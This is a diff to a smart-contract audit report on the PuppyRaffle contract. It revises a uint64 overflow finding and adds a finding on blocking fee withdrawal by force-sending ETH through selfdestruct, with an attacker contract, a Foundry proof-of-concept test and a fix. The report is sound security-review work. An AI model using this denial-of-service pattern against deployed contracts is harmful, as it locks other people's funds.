@@ -268,6 +268,7 @@ uint64 myVarCasted = uint64(myVar)
 **Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees` function. However, since `totalFees = totalFees + uint64(fee)`, if casting `fee` to a `uint64` causes a loss of precision, the final value of `totalFees` will be wrong and the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract because of the `require` condition at the beginning of `PuppyRaffle::withdrawFees`.
 
 **Proof of Concept:**
+
 1. We conclude a raffle of 4 players
 2. We then have 93 players enter a new raffle, and conclude it
 3. `totalFees` will be:
@@ -299,7 +300,7 @@ modifier playersEntered() {
         players[3] = playerFour;
         puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
         _;
-    }
+}
 
 function test_SelectWinnerOverflow() public playersEntered {
     // calling the first time selectWinner
@@ -338,7 +339,9 @@ function test_SelectWinnerOverflow() public playersEntered {
     puppyRaffle.withdrawFees();
 }
 ```
-4. You will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees`:
+</details>
+
+1. You will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees`:
 ```javascript
 require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
 ```
@@ -358,6 +361,74 @@ There are more attack vectors with that final require, so we recommend removing 
 - require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
 + require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
 ```
+
+
+
+## [H-5] Mishandling ETH in `PuppyRaffle::withdrawFees` function allows users to block the fees withdrawal 
+
+**Description:** Apparently the only way to deposit ETH in the `PuppyRaffle` contract is via the `enterRaffle` function.
+If that were the case, this strict equality:
+```javascript
+require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+```
+would always hold. But anyone can deposit ETH via `selfdestruct`, or by setting this contract as the [target of a beacon chain withdrawal](https://eth2book.info/capella/part2/deposits-withdrawals/withdrawal-processing/#performing-withdrawals) (see last paragraph of this link section), regardless of the contract not having a `receive` function.
+
+**Impact:** The `PuppyRaffle::withdrawFees` function would revert forever, not allowing to withdraw the fees and send them to the `feeAddress`
+
+**Proof of Concept:**
+1. Some users enter the raffle
+2. A user calls the `PuppyRaffle::selectWinner` function to end the raffle
+3. A malicious user, using `selfdestruct`, force sends ETH to the `PuppyRaffle` contract increasing its balance
+4. This will make `PuppyRaffle::withdrawFees` function revert and, since it would be really difficult to re-align the value of `totalFees` with the new contract balance, lead to a DoS (Denial of Service), making impossible to withdraw the fees.
+
+<details>
+<summary>Code</summary>
+
+```javascript
+contract SelfDestructAttacker {
+    address immutable i_target;
+
+    constructor(address target) {
+        i_target = target;
+    }
+
+    function attack() external {
+        selfdestruct(payable(i_target));
+    }
+}
+
+function test_WithdrawFeesSelfdestruct() public playersEntered {
+        // calling the first time selectWinner
+        vm.warp(block.timestamp + puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+        vm.roll(block.number + 1);
+        vm.prank(playerOne);
+        puppyRaffle.selectWinner();
+
+        // Deploying the attacker contract, and funding it with some ETH
+        SelfDestructAttacker attacker = new SelfDestructAttacker(address(puppyRaffle));
+        vm.deal(address(attacker), 0.1 ether);
+        console.log("Initial Puppy Raffle balance:", address(puppyRaffle).balance);
+
+        // calling attack function
+        attacker.attack();
+
+        console.log("Ending Puppy Raffle balance:", address(puppyRaffle).balance);
+        console.log("Puppy Raffle totalFees:", puppyRaffle.totalFees());
+
+        // We expect withdrawFees to revert due to the failed check
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        vm.prank(playerOne);
+        puppyRaffle.withdrawFees();
+    }
+```
+</details>
+
+**Recommended Mitigation:** To fix this issue, the code could be changed to this:
+```diff
+- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
++ require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
+```
+In this way, the `PuppyRaffle::withdrawFees` function can be called when the ETH balance is at least equal to `totalFees`, making the `selfdestruct` hack harmless.
 
 # Medium
 
